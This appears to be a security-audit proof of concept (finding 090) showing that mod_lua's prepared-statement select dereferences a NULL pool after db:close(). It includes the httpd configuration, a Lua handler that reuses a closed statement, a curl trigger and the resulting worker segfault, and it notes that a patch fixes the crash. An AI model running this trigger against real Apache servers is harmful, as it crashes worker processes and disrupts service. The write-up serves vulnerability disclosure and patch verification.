# PoC 090 — Prepared Select Uses Closed Pool

`lua_db_prepared_select()` calls `apr_pcalloc(st->db->pool, ...)` before it
checks that the handle is alive. After `db:close()`, the pool is `NULL`.

## Setup

Build httpd with `mod_lua` and an APR DBD driver (SQLite is convenient).

Minimal `conf/httpd.conf`:

```
LoadModule lua_module modules/mod_lua.so
LoadModule dbd_module modules/mod_dbd.so

DBDriver sqlite3
DBDParams "/tmp/090.sqlite"

Listen 8090
ServerName 127.0.0.1
DocumentRoot "/tmp/090-doc"

<Location /poc>
    SetHandler lua-script
    LuaMapHandler /poc /tmp/090-doc/poc.lua handle
</Location>
```

Initialise the database and Lua handler:

```
mkdir -p /tmp/090-doc
sqlite3 /tmp/090.sqlite 'CREATE TABLE t(v TEXT); INSERT INTO t VALUES("a");'
cat > /tmp/090-doc/poc.lua <<'LUA'
function handle(r)
    local db = r:dbacquire("mod_dbd")
    local st, err = db:prepare(r, "SELECT v FROM t WHERE v = %s")
    db:close()
    -- statement object is still reachable; reuse it post-close
    local ok, err2 = st:select(r, "a")
    r:puts("done\n")
    return apache2.OK
end
LUA
```

## Trigger

```
httpd -X -f /path/to/conf/httpd.conf &
curl -sS http://127.0.0.1:8090/poc
```

For a deterministic crash, run the parent under a debugger:

```
gdb --args httpd -X -f /path/to/conf/httpd.conf
(gdb) run
# in another shell
curl -sS http://127.0.0.1:8090/poc
```

## Observed effect

The worker faults inside `apr_pcalloc()` because `st->db->pool == NULL`. The
exact symptom depends on the allocator and APR build:

- glibc/jemalloc: SIGSEGV inside `apr_palloc_debug` / `apr_palloc` while
  dereferencing the NULL `apr_pool_t *`.
- APR pool-debug build: assertion failure `apr_pool_check_integrity()` aborts
  the process.

`error_log` shows `child pid NNNN exit signal Segmentation fault (11)` from the
parent reaping the crashed worker. The intended user-facing string

```
Database connection seems to be closed, please reacquire it.
```

is never returned to the client because the NULL-pool dereference happens
before that error path.

## Notes

The same shape applies to the patch sequencing: with the patch from finding
090 applied, the same Lua snippet returns the closed-connection error
without crashing.
